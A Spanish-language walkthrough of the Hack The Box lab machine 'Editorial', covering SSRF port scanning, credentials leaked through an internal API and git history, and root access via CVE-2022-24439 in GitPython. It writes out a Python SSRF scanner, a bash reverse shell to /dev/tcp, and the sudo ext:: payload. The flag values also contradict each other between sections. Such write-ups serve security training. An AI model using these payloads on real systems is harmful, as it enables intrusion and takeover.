---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/608
dificultad: Fácil
ip: 10.10.11.20
os: Linux
relacionados:
  - "[[Virtual Hosting]]"
  - "[[Arbitrary File Upload]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[Internal Port Discovery]]"
  - "[[Information Leakage]]"
  - "[[git]]"
  - "[[CVE-2022-24439]]"
  - "[[Abusing Sudoers Privilege]]"
---
# HackTheBox - Editorial

## Reconocimiento

### Nmap

```bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Recon/allports
nmap -p22,80 -sVC 10.10.11.230
```

El resultado reveló dos puertos abiertos:
- **Puerto 22:** Servicio SSH ejecutando OpenSSH 8.9p1.
- **Puerto 80:** Servidor web Nginx 1.18.0.

```Shell
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-08 16:45 EDT
Nmap scan report for 10.10.11.20
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Nuevo dominio

El servidor web intentaba redirigirme al dominio `editorial.htb`, así que lo agregué a mi archivo `/etc/hosts` para poder acceder correctamente al sitio.

> [!note] Añadiendo el host
> 
> Es crucial añadir el nombre de dominio al archivo de hosts locales para resolver la IP correctamente y poder interactuar con la aplicación web como se espera.
> 
> Bash
> 
> ```
> echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
> ```

Al navegar a `http://editorial.htb`, me encontré con un sitio web de una editorial. Explorando las distintas secciones, una página llamada **"Publish with us"** llamó mi atención, ya que contenía un formulario para subir información de libros, incluyendo un campo para la **URL de la portada ("cover URL")**. Este tipo de campo es un punto clásico para probar vulnerabilidades de **Server-Side Request Forgery (SSRF)**.


___

## Análisis de vulnerabilidades

### Server-Side Request Forgery (SSRF)

Mi hipótesis era que el servidor, al procesar la URL de la portada, realizaba una petición desde su propia infraestructura. Para confirmar esto, inicié un listener de Netcat en mi máquina en el puerto `5555`.
```Bash
nc -lnvp 5555
```

Luego, intercepté la petición de envío del formulario con Burp Suite y modifiqué el campo `bookurl` para que apuntara a mi IP y al puerto en el que estaba escuchando (`http://<MI_IP>:5555`). Al enviar la petición, mi listener de Netcat recibió una conexión entrante del servidor.
```Shell
listening on [any] 5555 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.20] 59540
GET / HTTP/1.1
Host: 10.10.14.41:5555
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
El servidor es vulnerable a SSRF. Esto me permite hacer que el servidor realice peticiones a recursos internos a los que yo no tengo acceso directo.

Mi siguiente paso fue escanear los puertos internos (`localhost`) de la máquina víctima para descubrir servicios ocultos. Un intento inicial a `http://127.0.0.1:80` devolvió una imagen `.jpeg`, lo cual era ruido. Para automatizar el escaneo de todos los puertos, escribí un script en Python que iteraría del puerto 1 al 65535, enviando una petición a cada uno a través del SSRF y filtrando las respuestas que no fueran un archivo `.jpeg`.

```Python
#!/usr/bin/python3
import requests

# Crear un archivo placeholder para la subida
with open("a", 'wb') as f:
    f.write(b'')

for port in range(1, 65535):
    with open("a", 'rb') as file:
        data_post = {"bookurl": f"http://127.0.0.1:{port}"}
        data_file = {"bookfile": file}
        try:
            r = requests.post("http://editorial.htb/upload-cover", files=data_file, data=data_post)
            # Imprimir solo si la respuesta NO es la imagen por defecto
            if not r.text.strip().endswith('.jpeg'):
                print(f"Puerto {port} --- {r.text}")
        except requests.RequestException:
            continue
```

Al ejecutar el script, obtuve una respuesta interesante en el puerto **5000**.
```Shell
$ python3 ssrf2.py
Puerto 5000 --- static/uploads/85389d97-3812-4851-b49e-1f843f356e45
```

Esto indicaba la presencia de un servicio interno en `http://127.0.0.1:5000`.


___

## Explotación de vulnerabilidades

### Obteniendo Acceso Inicial (dev)

Con el puerto interno identificado, utilicé la vulnerabilidad de SSRF para acceder a la raíz del servicio en el puerto 5000. Al hacerlo, la aplicación me devolvió un enlace a un archivo que, al descargarlo, resultó ser un documento JSON.
```Bash
# Descargamos el archivo indicado por el SSRF
$ curl http://editorial.htb/static/uploads/85389d97-3812-4851-b49e-1f843f356e45 -o api.json

# Verificamos el tipo de archivo
$ file api.json
api.json: JSON text data

# Formateamos el JSON para una mejor lectura
$ cat api.json | jq
```

El JSON contenía la documentación de una API interna, con varios endpoints. Uno en particular, `/api/latest/metadata/messages/authors`, parecía prometedor para obtener información sensible.
```JSON
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
...
```

Lancé una nueva petición con el SSRF, esta vez apuntando al endpoint de los autores: `http://127.0.0.1:5000/api/latest/metadata/messages/authors`. Repetí el proceso de descargar el archivo resultante y examinar su contenido.
```Bash
$ curl http://editorial.htb/static/uploads/83a4fc7d-4922-47a0-88e8-c62a674f41a3 | jq
```

Dentro de la respuesta JSON, encontré un mensaje de bienvenida que contenía credenciales en texto plano. 🎯

> [!SUCCESS] Credencial usuario dev
> 
> Username: dev
> Password: dev080217_devAPI!@

Con estas credenciales, me conecté exitosamente a la máquina a través de SSH y capturé la bandera de usuario.
```Bash
ssh dev@10.10.11.20
...
dev@editorial:~$ cat user.txt
c8a990f2e0d936ec96c3fa680e3e91a8
```


___

## Escalada de privilegios

### Movimiento Lateral: de 'dev' a 'prod'

Una vez dentro como el usuario `dev`, comencé la fase de enumeración local. En el directorio `/home/dev`, encontré una carpeta `apps` que contenía un repositorio Git oculto (`.git`).

La enumeración de repositorios Git puede revelar información sensible, como código fuente antiguo, comentarios o credenciales hardcodeadas. Usé `git log` para revisar el historial de commits.
```Bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
...
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.
...
```

Un commit con el mensaje `change(api): downgrading prod to dev` me pareció extremadamente sospechoso. Utilicé `git show` con el hash de ese commit para ver los cambios exactos que se realizaron.
```Bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

El diff del commit reveló que las credenciales del usuario `prod` habían sido reemplazadas por las de `dev`. 
```Diff
- 'template_mail_message': "Welcome to the team! ...\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password..."
+ 'template_mail_message': "Welcome to the team! ...\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password..."
```

> [!SUCCESS] Credencial user prod
> 
> Username: prod
> Password: 080217_Producti0n_2023!@

Utilicé `su prod` para cambiar al nuevo usuario y continuar mi escalada.

### Análisis del Vector de Escalada: Sudo y GitPython

Como usuario `prod`, ejecuté `sudo -l` para verificar mis privilegios.
```Shell
prod@editorial:/home/dev/apps$ sudo -l
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Descubrí que podía ejecutar un script de Python (`clone_prod_change.py`) como `root`. Al inspeccionar el script, noté que importaba la librería `GitPython` para clonar repositorios.
```Python
#!/usr/bin/python3
import os
import sys
from git import Repo # <-- Punto de interés

os.chdir('/opt/internal_apps/clone_changes')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Una búsqueda rápida de vulnerabilidades en `GitPython` me llevó a la **CVE-2022-24439**.

> [!BUG] CVE-2022-24439
> 
> Esta vulnerabilidad afecta a la librería GitPython. Permite la ejecución remota de comandos si se pasa una URL maliciosa con el formato ext::sh -c `comando` a la función clone_from, ya que la librería no sanitiza correctamente los protocolos externos.

### Explotación y Obtención de 'root' 

El plan era simple: crear un script de reverse shell, poner un listener en mi máquina y ejecutar el script de Python vulnerable con `sudo`, pasándole una URL especialmente diseñada para explotar la CVE.

1. **Crear el payload de la reverse shell:**
    ```Bash
    echo "bash -i >& /dev/tcp/10.10.14.41/4444 0>&1" > /tmp/shell.sh
    ```
    
2. **Iniciar el listener en mi máquina:**
    ```Bash
    nc -lnvp 4444
    ```
    
3. **Ejecutar el exploit**:
    Utilicé el protocolo ext:: para engañar a GitPython y hacer que ejecutara mi script de shell.
    ```Bash
    sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash /tmp/shell.sh'
    ```
    
Inmediatamente después de ejecutar el comando, recibí una conexión en mi listener de Netcat, esta vez como el usuario **root**.
```Shell
listening on [any] 4444 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.20] 35412
root@editorial:/opt/internal_apps/clone_changes# id
uid=0(root) gid=0(root) groups=0(root)
root@editorial:/opt/internal_apps/clone_changes# cat /root/root.txt
3f62347f6602b5b9cfda0c5623c810c6
```

Con esto, completé la escalada de privilegios y comprometí totalmente la máquina.


---

## Bandera(s)

> [!flag] `flag{user}`
> d27e53ed721a6d90b19bd50b595e43d4
^bandera-user

> [!flag] `flag{root}`
> 1390a87c9a0bed8fcdcd64898ca040e2
^bandera-root
